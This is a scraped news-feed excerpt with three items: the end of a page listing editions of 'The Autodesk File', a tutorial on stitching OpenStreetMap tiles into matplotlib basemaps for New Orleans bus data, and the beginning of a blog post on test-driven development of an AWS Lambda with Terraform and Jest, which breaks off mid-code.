are indicated by an
<img src="https://www.fourmilab.ch/autofile/e5/i/xref.png" width="16" height="16" alt="[Ref]">
icon which navigates to the cited page when clicked.  A navigation
bar at the left provides instant access to all chapters, and
highlights the current chapter regardless of how you arrived there.
The <a href="https://www.fourmilab.ch/autofile/e5/">Fifth Edition</a> is compatible with
most modern desktop browsers.  The Safari browser on iOS mobile devices
(iPad, iPhone) has a serious flaw in scrolling text within a
window which has remained uncorrected for years.  On these devices,
you can read the
<a href="https://www.fourmilab.ch/autofile/e5/indexi.html">iOS work-around edition</a>,
which contains a device-specific fix for the problem.
<br>
</p>

<h2><a href="https://www.fourmilab.ch/autofile/www/autoframe.html">Fourth Edition with Frames</a></h2>

<p>
For older browsers which which support frames, this
edition allows navigation through the book with
a panel which lets you click chapter titles and go
directly to that chapter.  If, in addition, your browser
supports JavaScript, simply moving the mouse over a
footnote icon, like this one:
<img src="https://www.fourmilab.ch/autofile/www/i/foot.gif" width="15" height="15" alt="[Footnote]">
will pop up a window containing the footnote.  Moving the
mouse over other footnotes displays them in the auxiliary window.
Browsers without JavaScript (or users who have disabled
JavaScript in their browsers) may display footnotes in
the main document window by clicking the footnote icon,
then use their browser's “Back” button to return to the
main text.  Users with more modern browers will find the
<a href="https://www.fourmilab.ch/autofile/e5/">Fifth Edition</a> easier to read and
navigate.
</p>

<h2><a href="https://www.fourmilab.ch/autofile/www/autofile.html">No-Frame Web Edition</a></h2>

<p>
<a href="https://www.fourmilab.ch/autofile/www/autofile.html"><img src="https://www.fourmilab.ch/autofile/www/figures/any_browser.gif" width="88" height="31" alt="Works with Any Browser"></a>
Users with browsers which do not support frames, or those
who prefer a more linear presentation in a single
window, may access a no-frame edition of <cite>The Autodesk
File</cite> with identical content to the frame-based book.
The no-frame edition includes the pop-up footnotes present
in the frame edition, but since few browsers which lack
frames are likely to support JavaScript, you can simply click
on the footnote icon to display it, then use the
“Back” button or keystroke to return to the text containing
the footnote.
<br>
</p>

<h2><a href="https://www.fourmilab.ch/autofile/afpdf.zip" name="offline">Acrobat PDF Edition</a></h2>

<p>
<a href="https://www.fourmilab.ch/autofile/afpdf.zip"><img src="https://www.fourmilab.ch/autofile/www/figures/afpdf.gif" width="226" height="234" alt="Acrobat PDF Screen"></a>
If you prefer to read the book off-line, you can
<a href="https://www.fourmilab.ch/autofile/afpdf.zip">download a PDF edition</a> (5.8 Mb, ZIP compressed)
which you
can read with the Adobe Acrobat Reader utility,
available for most personal computers and Unix workstations,
which may be
<a href="http://www.adobe.com/acrobat/readstep.html" target="Autofile_Aux">downloaded
free of charge</a> directly from the
<a href="http://www.adobe.com/" target="Autofile_Aux">Adobe Systems</a> Web site.
The Acrobat PDF edition preserves all the formatting of
the original book, some of which was lost in creating
the Web editions, and permits point-and-click navigation
among chapters and to follow cross-references in the text.
</p>

<p>
Adobe is one of the most consistently irritating companies
on Earth with which to do business.  I'd like to give you
a nice button for downloading your own copy of Acrobat Reader,
but they won't let me use the image without “registering”
and “licensing” it, which I'm certainly not going to do
in order to promote their product and its file format.
<br>
</p>

<h2><a href="https://www.fourmilab.ch/autofile/afps.zip">PostScript Edition</a></h2>

<p>
<cite>The Autodesk File</cite> was originally typeset
using <a href="http://www.tug.org/" target="Autofile_Aux">TeX</a> with the
LaTeX macro package.  Camera-ready copy was generated
from PostScript created by the <tt>dvips</tt>
utility.  The PostScript edition is a single monolithic
file, more than 16 megabytes, containing the
entire book as originally typeset.  You can read it on-line
with a PostScript viewing program such as
<a href="https://www.ghostscript.com/" target="Autofile_Aux">GhostScript</a>
(which is free), or print it on any PostScript-compatible
printer.  <strong>Before sending this
file to a printer, consider that the book is almost
900 pages long!</strong>  This is a <em>big</em> print
job, which will consume lots of paper, toner, and,
potentially, good will of any colleagues with whom
you share the printer.  The PostScript edition may be
downloaded as either a <a href="https://www.fourmilab.ch/autofile/afps.zip">ZIPped archive</a>
or a <a href="https://www.fourmilab.ch/autofile/autofile.ps.gz"><b>gzip</b> compressed PostScript
file</a>; both are 4.9 Mb in length and uncompress to a 16
Mb PostScript file.
</p>

<hr>
<address>
by <a href="https://www.fourmilab.ch/" target="_top">John Walker</a>
</address>

<h3><a href="https://www.fourmilab.ch/autofile/images/">Autodesk Vintage Image Gallery</a></h3>
<h3><a href="https://www.fourmilab.ch/autofile/images/premises/">Autodesk Premises Over the Years</a></h3>
<h3><a href="https://www.fourmilab.ch/">Fourmilab Home Page</a></h3>



</div>]]>
            </description>
            <link>https://www.fourmilab.ch/autofile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028729</guid>
            <pubDate>Sun, 08 Nov 2020 20:32:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adding OpenStreetMaps to Matplotlib]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25028727">thread link</a>) | @jhrabb
<br/>
November 8, 2020 | https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/ | <a href="https://web.archive.org/web/*/https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><p>Adding context to thousands of dots</p><p> published:&nbsp; <time datetime="2020-10-21T00:00:00+00:00"> 21 October 2020 </time></p></header><p>Adding a map to your visuals is a great way to quickly understand the geographic information you're trying to investigate. Thankfully there are quite a few packages and libraries (like <a href="https://geopandas.org/">geopandas</a>, <a href="https://scitools.org.uk/cartopy/docs/latest/">cartopy</a>, <a href="https://github.com/rossant/smopy">smopy</a>, <a href="https://github.com/python-visualization/folium">folium</a>, <a href="https://github.com/MatthewDaws/TileMapBase">tilemapbase</a>, or <a href="https://ipyleaflet.readthedocs.io/en/latest/">ipyleaflet</a>) that can make creating these visuals fairly straightforward and easy in your jupyter notebooks or whatever stack you're using.</p><p>For this essay though, I'll walk through the process of adding a base-map from OpenStreetMap to you're matplotlib visuals without using any of these libraries. In the end, we'll have a visual much like this (very messy) scatter-plot of buses as they service route 16 in New Orleans.</p><img alt="A plot of the ~466,000 position reports for buses servicing route 16 as they work their way up and down South Claiborne Avenue, between South Carrollton Avenue and Harrah's near the French Quarter." src="https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/route-16-plot.png"><div id="how-it-works"><h2>How it Works</h2><p>The ability to add our base-map to our <a href="https://matplotlib.org/">matplotlib</a> visuals relies on matplotlib's <a href="https://matplotlib.org/3.2.1/api/_as_gen/matplotlib.pyplot.imshow.html">imshow() function</a>, which internally uses the <a href="https://python-pillow.org/">Pillow library</a> to display images, or any other two dimensional scalar data we want (like <a href="https://numpy.org/doc/stable/reference/generated/numpy.ndarray.html">numpy arrays</a>).</p><p>For example, if we download <a href="https://bryanbrattlof.com/pages/hi/profile.png">my self-portrait</a>, we can add the image to a plot using code like this:</p><div><pre><span></span><span>from</span> <span>matplotlib</span> <span>import</span> <span>pyplot</span> <span>as</span> <span>plt</span>

<span>img</span> <span>=</span> <span>plt</span><span>.</span><span>imread</span><span>(</span><span>'path/to/my/self-portrait.png'</span><span>)</span>
<span>plt</span><span>.</span><span>imshow</span><span>(</span><span>img</span><span>)</span>

<span>plt</span><span>.</span><span>show</span><span>()</span>
</pre></div><p>Resulting in a matplotlib visual that looks like this:</p><p><img alt="A matplotlib plot of a self portrait (stick figure drawing) of Bryan Brattlof" src="https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/self-portrait-plot.png"></p></div><div id="creating-the-map"><h2>Creating the Map</h2><p>The easiest way to generate the base-map for <code>plt.imshow()</code> is to use a mapping service. These mapping services use enormous amounts of raw computing power to take the <a href="https://wiki.openstreetmap.org/wiki/Planet.osm">terabytes of map data</a> and render a map for us. Today there are quite a few services available online. The one I enjoy working with (and the one we will be using in this essay) is a free, community maintained service called <a href="https://www.openstreetmap.org/about">OpenStreetMap</a>.</p></div><div id="tile-servers"><h2>Tile Servers</h2><p>To make updating and sharing their work easier, OpenStreetMap (and virtually all other mapping services) have split their maps into billions of tiny (256 pixel) sections, called tiles, that we can download individually from their tile servers.</p><p>OpenStreetMap has <a href="https://wiki.openstreetmap.org/wiki/Tile_servers">quite a few tile servers</a> that style or prioritize different map features with some having a slightly different <a href="https://en.wikipedia.org/wiki/API">API</a> to request tiles. For example the <a href="http://maps.stamen.com/toner/#12/29.9722/-90.1167">Stamen Toner Map</a> that I used in the first visual and prefer for it's simple color pallet.</p><p>For this essay though, we'll use the default tile server's API to request tiles:</p><div><pre><span></span>URL = "https://tile.openstreetmap.org/{z}/{x}/{y}.png".format
</pre></div><p>This string formatting function will replace the <code>{z}</code>, <code>{x}</code>, and <code>{y}</code> with the tile coordinates and zoom level of the tile we want to download, where:</p><ul><li><code>{z}</code> is the "zoom" level ranging from 0 to 18. Zoom 0 being the most "zoomed out" and needs only one tile to depict <a href="https://tile.openstreetmap.org/0/0/0.png">the entire world</a> at that level.</li><li><code>{x}</code> is the number of tiles from the left most tile of the map.</li><li>and <code>{y}</code> is the number of tiles from the top most tile of the map.</li></ul><p>Both <code>{x}</code> and <code>{y}</code> depend on the zoom level <code>{z}</code> we've chosen, with larger zoom levels requiring more tiles to render the map. To understand how to calculate which tiles we need for our data-set, we'll need to understand how mapping projections work.</p></div><div id="map-projections"><h2>Map Projections</h2><p>Without going too deep into mapping projections, OpenStreetMap (along with many other mapping services) needed a way to convert <span>(<i>lat</i>, <i>lon</i>)</span> coordinates into planer <span>(<i>x</i>, <i>y</i>)</span> coordinates which work with their maps. Sadly there is no perfect way to do this.</p><p>Google (and everyone else eventually) settled on a variant of the <a href="https://en.wikipedia.org/wiki/Mercator_projection">Mercator Projection</a> called the <a href="https://en.wikipedia.org/wiki/Web_Mercator_projection">Web Mercator Projection</a> which simplifies the conversion by assuming the earth is a perfect sphere (it's not). This can (and does) lead to confusion in the final visuals and why many official bodies refuse to accept this standard.</p><p>The advantage of assuming the earth is a perfect sphere is that the equation to convert our GPS coordinates into Web Mercator coordinates is fairly straightforward. The <a href="https://wiki.openstreetmap.org/wiki/Main_Page">OpenStreetMap Wiki</a> has the algorithm available in <a href="https://wiki.openstreetmap.org/wiki/Mercator">multiple programming languages</a>. Here is the one for Python:</p><div><pre><span></span><span>import</span> <span>math</span>
<span>TILE_SIZE</span> <span>=</span> <span>256</span>

<span>def</span> <span>point_to_pixels</span><span>(</span><span>lon</span><span>,</span> <span>lat</span><span>,</span> <span>zoom</span><span>):</span>
    <span>"""convert gps coordinates to web mercator"""</span>
    <span>r</span> <span>=</span> <span>math</span><span>.</span><span>pow</span><span>(</span><span>2</span><span>,</span> <span>zoom</span><span>)</span> <span>*</span> <span>TILE_SIZE</span>
    <span>lat</span> <span>=</span> <span>math</span><span>.</span><span>radians</span><span>(</span><span>lat</span><span>)</span>

    <span>x</span> <span>=</span> <span>int</span><span>((</span><span>lon</span> <span>+</span> <span>180.0</span><span>)</span> <span>/</span> <span>360.0</span> <span>*</span> <span>r</span><span>)</span>
    <span>y</span> <span>=</span> <span>int</span><span>((</span><span>1.0</span> <span>-</span> <span>math</span><span>.</span><span>log</span><span>(</span><span>math</span><span>.</span><span>tan</span><span>(</span><span>lat</span><span>)</span> <span>+</span> <span>(</span><span>1.0</span> <span>/</span> <span>math</span><span>.</span><span>cos</span><span>(</span><span>lat</span><span>)))</span> <span>/</span> <span>math</span><span>.</span><span>pi</span><span>)</span> <span>/</span> <span>2.0</span> <span>*</span> <span>r</span><span>)</span>

    <span>return</span> <span>x</span><span>,</span> <span>y</span>
</pre></div></div><div id="downloading-a-tile"><h2>Downloading A Tile</h2><p>Now we can use the <code>point_to_pixels()</code> function to calculate the number of pixels from the top-left corner of the OSM map from the GPS coordinates in our data-set at any <code>zoom</code> level, for example the French Quarter of New Orleans:</p><div><pre><span></span><span>zoom</span> <span>=</span> <span>16</span>
<span>x</span><span>,</span> <span>y</span> <span>=</span> <span>point_to_pixels</span><span>(</span><span>-</span><span>90.064279</span><span>,</span> <span>29.95863</span><span>,</span> <span>zoom</span><span>)</span>
</pre></div><p>Dividing the number of pixels by <code>TILE_SIZE</code> will then give us the <code>{x}</code> and <code>{y}</code> that we need for the <code>URL()</code> function we created <a href="#tile-servers">a few sections ago</a> for the OpenStreetMap API.</p><div><pre><span></span><span>x_tiles</span><span>,</span> <span>y_tiles</span> <span>=</span> <span>int</span><span>(</span><span>x</span> <span>/</span> <span>TILE_SIZE</span><span>),</span> <span>int</span><span>(</span><span>y</span> <span>/</span> <span>TILE_SIZE</span><span>)</span>
</pre></div><p>That we can then use, along with the <a href="https://requests.readthedocs.io/en/master/">requests</a> and <a href="https://python-pillow.org/">Pillow</a> libraries, to download a tile from the OpenStreetMap tile servers:</p><div><pre><span></span><span>from</span> <span>io</span> <span>import</span> <span>BytesIO</span>
<span>from</span> <span>PIL</span> <span>import</span> <span>Image</span>
<span>import</span> <span>requests</span>

<span># format the url</span>
<span>url</span> <span>=</span> <span>URL</span><span>(</span><span>x</span><span>=</span><span>x_tiles</span><span>,</span> <span>y</span><span>=</span><span>y_tiles</span><span>,</span> <span>z</span><span>=</span><span>zoom</span><span>)</span>

<span># make the request</span>
<span>with</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>)</span> <span>as</span> <span>resp</span><span>:</span>
    <span>img</span> <span>=</span> <span>Image</span><span>.</span><span>open</span><span>(</span><span>BytesIO</span><span>(</span><span>resp</span><span>.</span><span>content</span><span>))</span>

<span># plot the tile</span>
<span>plt</span><span>.</span><span>imshow</span><span>(</span><span>img</span><span>)</span>
<span>plt</span><span>.</span><span>show</span><span>()</span>
</pre></div><p>Producing a tile of Jackson Square in the French Quarter of New Orleans:</p><p><img alt="the tile" src="https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/french-quarter-plot.png"></p></div><div id="stitching-tiles-together"><h2>Stitching Tiles Together</h2><p>To download all the tiles needed for our visual, we'll need to calculate the limits of the data we'll be using in our visual. There are many ways we can do this, all of them are valid. For simplicity though, I'll calculate the <span><i>min</i></span> and <span><i>max</i></span> of both the <code>lat</code> and <code>lon</code> columns in my <a href="https://pandas.pydata.org/">pandas</a> DataFrame:</p><div><pre><span></span><span>top</span><span>,</span> <span>bot</span> <span>=</span> <span>df</span><span>.</span><span>lat</span><span>.</span><span>max</span><span>(),</span> <span>df</span><span>.</span><span>lat</span><span>.</span><span>min</span><span>()</span>
<span>lef</span><span>,</span> <span>rgt</span> <span>=</span> <span>df</span><span>.</span><span>lon</span><span>.</span><span>min</span><span>(),</span> <span>df</span><span>.</span><span>lon</span><span>.</span><span>max</span><span>()</span>
</pre></div><p>This gives us a bounding box (in GPS coordinates) that encompasses our entire data-set.</p><p>Next, just like we did in <a href="#downloading-a-tile">the last section</a>, we'll use the <code>point_to_pixels()</code> function to convert our GPS coordinates into Web Mercator coordinates.</p><div><pre><span></span><span>zoom</span> <span>=</span> <span>13</span>
<span>x0</span><span>,</span> <span>y0</span> <span>=</span> <span>point_to_pixels</span><span>(</span><span>lef</span><span>,</span> <span>top</span><span>,</span> <span>zoom</span><span>)</span>
<span>x1</span><span>,</span> <span>y1</span> <span>=</span> <span>point_to_pixels</span><span>(</span><span>rgt</span><span>,</span> <span>bot</span><span>,</span> <span>zoom</span><span>)</span>
</pre></div><p>That we can then divide by <code>TILE_SIZE</code> to calculate the minimum and maximum number of tiles we'll need to download for both the <code>{x}</code> and <code>{y}</code> arguments for the API:</p><div><pre><span></span><span>x0_tile</span><span>,</span> <span>y0_tile</span> <span>=</span> <span>int</span><span>(</span><span>x0</span> <span>/</span> <span>TILE_SIZE</span><span>),</span> <span>int</span><span>(</span><span>y0</span> <span>/</span> <span>TILE_SIZE</span><span>)</span>
<span>x1_tile</span><span>,</span> <span>y1_tile</span> <span>=</span> <span>math</span><span>.</span><span>ceil</span><span>(</span><span>x1</span> <span>/</span> <span>TILE_SIZE</span><span>),</span> <span>math</span><span>.</span><span>ceil</span><span>(</span><span>y1</span> <span>/</span> <span>TILE_SIZE</span><span>)</span>
</pre></div><p>As a precaution, we'll add an <code>assert</code> statement to limit the number of tiles we can download and save us from the embarrassment of accidentally burdening OpenStreetMap tile servers.</p><div><pre><span></span><span>assert</span> <span>(</span><span>x1_tile</span> <span>-</span> <span>x0_tile</span><span>)</span> <span>*</span> <span>(</span><span>y1_tile</span> <span>-</span> <span>y0_tile</span><span>)</span> <span>&lt;</span> <span>50</span><span>,</span> <span>"That's too many tiles!"</span>
</pre></div><p>Now that we've calculated which tiles we need to download from OpenStreetMap, we can use the built-in <a href="https://docs.python.org/3/library/itertools.html">itertools</a><code>product()</code> function to loop through every tile, downloading and saving the tiles to a single large pillow image using <a href="https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.paste">Pillow's paste() function</a>:</p><div><pre><span></span><span>from</span> <span>itertools</span> <span>import</span> <span>product</span>

<span># full size image we'll add tiles to</span>
<span>img</span> <span>=</span> <span>Image</span><span>.</span><span>new</span><span>(</span><span>'RGB'</span><span>,</span> <span>(</span>
    <span>(</span><span>x1_tile</span> <span>-</span> <span>x0_tile</span><span>)</span> <span>*</span> <span>TILE_SIZE</span><span>,</span>
    <span>(</span><span>y1_tile</span> <span>-</span> <span>y0_tile</span><span>)</span> <span>*</span> <span>TILE_SIZE</span><span>))</span>

<span># loop through every tile inside our bounded box</span>
<span>for</span> <span>x_tile</span><span>,</span> <span>y_tile</span> <span>in</span> <span>product</span><span>(</span><span>range</span><span>(</span><span>x0_tile</span><span>,</span> <span>x1_tile</span><span>),</span> <span>range</span><span>(</span><span>y0_tile</span><span>,</span> <span>y1_tile</span><span>)):</span>
    <span>with</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>URL</span><span>(</span><span>x</span><span>=</span><span>x_tile</span><span>,</span> <span>y</span><span>=</span><span>y_tile</span><span>,</span> <span>z</span><span>=</span><span>zoom</span><span>))</span> <span>as</span> <span>resp</span><span>:</span>
        <span>tile_img</span> <span>=</span> <span>Image</span><span>.</span><span>open</span><span>(</span><span>BytesIO</span><span>(</span><span>resp</span><span>.</span><span>content</span><span>))</span>

    <span># add each tile to the full size image</span>
    <span>img</span><span>.</span><span>paste</span><span>(</span>
        <span>im</span><span>=</span><span>tile_img</span><span>,</span>
        <span>box</span><span>=</span><span>((</span><span>x_tile</span> <span>-</span> <span>x0_tile</span><span>)</span> <span>*</span> <span>TILE_SIZE</span><span>,</span> <span>(</span><span>y_tile</span> <span>-</span> <span>y0_tile</span><span>)</span> <span>*</span> <span>TILE_SIZE</span><span>))</span>

<span>plt</span><span>.</span><span>imshow</span><span>(</span><span>img</span><span>)</span>
<span>plt</span><span>.</span><span>show</span><span>()</span>
</pre></div><p>Resulting in a plot like this:</p><p><img alt="A plot of New Orleans using the script we just developed to stitch multiple tiles together into one continuous map that we can place under our scatter plot in the next section." src="https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/the-basemap.png"></p><p>The eagle-eyed among us will notice the image is too large for the visual we want to create. This is because of the <code>math.ceil()</code> and <code>int()</code> functions we used to round the pixel coordinates into <code>{x}</code> and <code>{y}</code> tiles we used above. To get our image back to size we'll need to crop out the fractions of tiles not inside our bounding box.</p></div><div id="cropping-the-basemap"><h2>Cropping the Basemap</h2><p>To help my human-eyed brethren, I added some lines to our previous graphic to help understand what's going on. Essentially some fraction of each tile we've downloaded (outlined in black) will be used in our final visual (outlined in red) that we calculated in <a href="#stitching-tiles-together">the last section</a>. Our goal for this section is to trim the fraction of tiles outside of our red square.</p><p><img alt="A plot of New Orleans with black lines outlining each tile we downloaded from the tile servers overlaid with a red line representing the section of the map we wish to keep after we crop the image." src="https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/basemap-cropping-lines.png"></p><p>To curtail our oversize image, we'll use pillow's <a href="https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.crop">Image.crop()</a> function, which takes a tuple <code>(left, top, right, bottom)</code> measured in pixels from the top left corner to crop our image.</p><p><a href="https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/StitchingTilesTogether">From our work above</a>, we know the pixel coordinates of the red square is defined as <code>x0, y0</code> and <code>x1, y1</code>. We can then multiply the tile coordinates <code>x0_tile, y0_tile</code> by <code>TILE_SIZE</code> to find the pixel coordinates for the top-left corner of the current (oversize) basemap:</p><div><pre><span></span><span>x</span><span>,</span> <span>y</span> <span>=</span> <span>x0_tile</span> <span>*</span> <span>TILE_SIZE</span><span>,</span> <span>y0_tile</span> <span>*</span> <span>TILE_SIZE</span>
</pre></div><p>It is a simple process of subtracting the edges of our red square from the pixel coordinates we just calculated for our oversize image to crop it to our desired size:</p><div><pre><span></span><span>img</span> <span>=</span> <span>img</span><span>.</span><span>crop</span><span>((</span>
    <span>int</span><span>(</span><span>x</span> <span>-</span> <span>x0</span><span>),</span>  <span># left</span>
    <span>int</span><span>(</span><span>y</span> <span>-</span> <span>y0</span><span>),</span>  <span># top</span>
    <span>int</span><span>(</span><span>x</span> <span>-</span> <span>x1</span><span>),</span>  <span># right</span>
    <span>int</span><span>(</span><span>y</span> <span>-</span> <span>y1</span><span>)))</span> <span># bottom</span>

<span>plt</span><span>.</span><span>imshow</span><span>(</span><span>img</span><span>)</span>
<span>plt</span><span>.</span><span>show</span><span>()</span>
</pre></div><p>Resulting in our final (properly sized) basemap for our visual:</p><p><img alt="A, now properly sized, plot of New Orleans using the cropping script we just developed to resize our basemap to the proper size for our visual." src="https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/basemap-cropped.png"></p></div><div id="plotting-the-data"><h2>Plotting The Data</h2><p>Finally, with our basemap created, we can plot our data just like any other visual with some key exceptions. We can start by setting a <a href="https://matplotlib.org/3.3.1/api/_as_gen/matplotlib.pyplot.subplot.html">matplotlib subplots()</a> and a <a href="https://matplotlib.org/3.3.1/api/_as_gen/matplotlib.axes.Axes.scatter.html">scatter()</a> plot for the <code>lat</code> and <code>lon</code> columns in our pandas DataFrames:</p><div><pre><span></span><span>fig</span><span>,</span> <span>ax</span> <span>=</span> <span>plt</span><span>.</span><span>subplots</span><span>()</span>
<span>ax</span><span>.</span><span>scatter</span><span>(</span><span>df</span><span>.</span><span>lon</span><span>,</span> <span>df</span><span>.</span><span>lat</span><span>,</span> <span>alpha</span><span>=</span><span>0.1</span><span>,</span> <span>c</span><span>=</span><span>'red'</span><span>,</span> <span>s</span><span>=</span><span>1</span><span>)</span>
</pre></div><p>Then we'll add an extra argument to the <code>imshow()</code> function to properly locate our image in the final visual. The <code>extent</code> argument is used to move a image to a <a href="https://matplotlib.org/3.3.1/tutorials/intermediate/imshow_extent.html">particular region in dataspace</a>.</p><div><pre><span></span><span>ax</span><span>.</span><span>imshow</span><span>(</span><span>img</span><span>,</span> <span>extent</span><span>=</span><span>(</span><span>lef</span><span>,</span> <span>rgt</span><span>,</span> <span>bot</span><span>,</span> <span>top</span><span>))</span>
</pre></div><p>Next, we'll lock down the <span><i>x</i></span> and <span><i>y</i></span> axes to the limits we defined <a href="#stitching-tiles-together">a few sections ago</a> by using the <code>set_ylim()</code> and <code>set_xlim()</code> functions.</p><div><pre><span></span><span>ax</span><span>.</span><span>set_ylim</span><span>(</span><span>bot</span><span>,</span> <span>top</span><span>)</span>
<span>ax</span><span>.</span><span>set_xlim</span><span>(</span><span>lef</span><span>,</span> <span>rgt</span><span>)</span>
</pre></div><p>All of this work will produce a simple graphic with a (gorgeous) basemap of buses servicing New Orleans' Route 16.</p><p><img alt="The final visual we've been working to depicting the roughly 400,000 position reports of buses as they service route 16 of New Orleans." src="https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/final-visual.png"></p></div></div></div>]]>
            </description>
            <link>https://bryanbrattlof.com/adding-openstreetmaps-to-matplotlib/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028727</guid>
            <pubDate>Sun, 08 Nov 2020 20:32:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TDD kata with serverless services in AWS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25028650">thread link</a>) | @gchinis
<br/>
November 8, 2020 | https://blog.gchinis.com/posts/tdd-aws-serverless-services/ | <a href="https://web.archive.org/web/*/https://blog.gchinis.com/posts/tdd-aws-serverless-services/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last week, I’ve re-read “Test Driven Development: By Example” by Kent Beck.
I was amazed by the simplicity of his process, consisting of small pragmatic steps.
So, I decided to put the process to the test in an unfamiliar domain.</p>
<h3 id="the-kata">The kata</h3>
<p>In this kata, I am going to develop a serverless service in AWS using a Lambda and the API Gateway.
I chose this task because, on the one hand, it will contain a fair amount of infrastructure code, which is considered hard to test.
On the other hand, because I wanted a task that was more abstract and closer to a business requirement in contrast to a technical requirement like ‘<em>deploy an AWS HTTP API Gateway</em>’.</p>
<p>My goal is to understand whether TDD for infrastructure is possible and what are the trade-offs.</p>
<h3 id="the-tdd-process">The TDD process</h3>
<p>I am going to be following the TDD process, as described in the book, as close as possible.
I will attempt to follow the Red-Green-Refactor cycle.</p>
<ul>
<li>Red: Start by writing a failing test. It may not even compile at that time.</li>
<li>Green: Make the test pass, committing any sin necessary in the process.</li>
<li>Refactor: Eliminate any duplication introduced to make the tests green.</li>
</ul>
<p>One important piece of the process is having a <strong>To-Do</strong> list.
It is going to help me keep track of what is left to do and help me discover what to work on next.</p>
<div><pre><code data-lang="text">To-Do List
==========
* Publish sales API</code></pre></div>
<p>What is new for me is an appreciation of TDD as a process to manage my uncertainty and fear, rather than a process to write tests.
You can read more about this in my previous blog post, <a href="https://blog.gchinis.com/posts/the-trade-offs-of-tdd/">here</a>.</p>
<h3 id="tech-stack">Tech stack</h3>
<p>Being cognizant of the uncertainty, I decided to use as much as possible familiar tools.</p>
<ul>
<li>Terraform for infrastructure provisioning.</li>
<li>Javascript for the Lambda.</li>
<li>Jest as a test runner.</li>
</ul>
<p>There are probably tools better than terraform when it comes to testability.
What I want to demonstrate is that the TDD process is independent of the tools you have to work with.</p>
<p>There are also aspects of this task that I am not familiar with:</p>
<ul>
<li>Using the API Gateway</li>
<li>Using TDD in an infrastructure heavy task</li>
</ul>
<p>I will have to be careful to tackle them in small increments, so that I don’t get overwhelmed.</p>
<h2 id="putting-terraform-under-test-harness">Putting Terraform under test harness</h2>
<p>‘<em>Publish sales API</em>’ is a very big task to do in one step.
So, let’s look for a more achievable intermediate step to start with.
If I can have a test which applies a minimal terraform configuration, I will at least know that I can put terraform under test harness, which is a prerequisite to the TDD cycle.</p>
<div><pre><code data-lang="text">To-Do List
==========
* Publish sales API
<span>* Run terraform in test</span></code></pre></div>
<p><strong>Test snippet</strong></p>
<p>The test uses the simplest approach I can think of to drive terraform.
It does what I would do in the command line.</p>
<div><pre><code data-lang="javascript"><span>const</span> {<span>execSync</span>} <span>=</span> <span>require</span>(<span>'child_process'</span>);
<span>const</span> <span>https</span> <span>=</span> <span>require</span>(<span>'https'</span>);
<span>const</span> <span>AWS</span> <span>=</span> <span>require</span>(<span>'aws-sdk'</span>)

<span>describe</span>(<span>'serverless'</span>, () =&gt; {
  <span>test</span>(<span>'run terraform'</span>, () =&gt; {
    <span>const</span> <span>modulePath</span> <span>=</span> <span>'./src'</span>;
    <span>execSync</span>(<span>'terraform init'</span>, {<span>cwd</span><span>:</span> <span>modulePath</span>});
    <span>const</span> <span>applyResp</span> <span>=</span> <span>execSync</span>(<span>'terraform apply -auto-approve'</span>, {<span>cwd</span><span>:</span> <span>modulePath</span>});
    <span>expect</span>(<span>applyResp</span>.<span>toString</span>()).<span>toContain</span>(<span>'Apply complete!'</span>)
  })
})
</code></pre></div><p><strong>Code snippet</strong></p>
<div><pre><code data-lang="terraform"><span>provider</span> <span>"aws"</span> {
  <span>region</span> = <span>"eu-central-1"</span>
}
</code></pre></div><p>Writing this test was hard work but making it green required only 3 lines of boilerplate code!
Still, it is an important milestone.
It demonstrates that it is possible to use jest to drive terraform to <em>act</em> and then also <em>assert</em> on the outcome of the operation.</p>
<div><pre><code data-lang="text">To-Do List
==========
* Publish sales API
<span>☑️ Run terraform in test</span></code></pre></div>
<h2 id="deploying-the-lambda">Deploying the Lambda</h2>
<p>Even with terraform under test harness, deploying the sales API in one step, is still too big a task.
What I find especially challenging about the task ahead, is doing all the infrastructure automation in one go, especially since I am unfamiliar with the API Gateway.</p>
<p>I think a smaller task, that I feel comfortable to undertake, is to deploy the AWS Lambda with my application code and make sure I can invoke it using the aws-sdk.
Let’s update the To-Do List with our next steps.</p>
<div><pre><code data-lang="text">To-Do List
==========
* Publish sales API
☑️ Run terraform in test
<span>* Deploy the sales Lambda</span></code></pre></div>
<h4 id="test-snippet">Test snippet</h4>
<p>I’ve refactor the test code from before, and I’ve extracted a <code>beforeAll</code> block where the
terraform related code now lives.</p>
<p>The test itself is using the aws-sdk to invoke a Lambda function and asserts that the function returned the expected values.
The name of the function is coming from terraform.</p>
<div><pre><code data-lang="javascript"><span>const</span> {<span>execSync</span>} <span>=</span> <span>require</span>(<span>'child_process'</span>);
<span>const</span> <span>https</span> <span>=</span> <span>require</span>(<span>'https'</span>);
<span>const</span> <span>AWS</span> <span>=</span> <span>require</span>(<span>'aws-sdk'</span>)

<span>describe</span>(<span>'lambda'</span>, () =&gt; {
    <span>jest</span>.<span>setTimeout</span>(<span>20000</span>)
    <span>let</span> <span>lambda_name</span>;

    <span>beforeAll</span>(() =&gt; {
        <span>execSync</span>(<span>'terraform init'</span>, {<span>cwd</span><span>:</span> <span>'./src'</span>});
        <span>const</span> <span>modulePath</span> <span>=</span> <span>'./src'</span>;
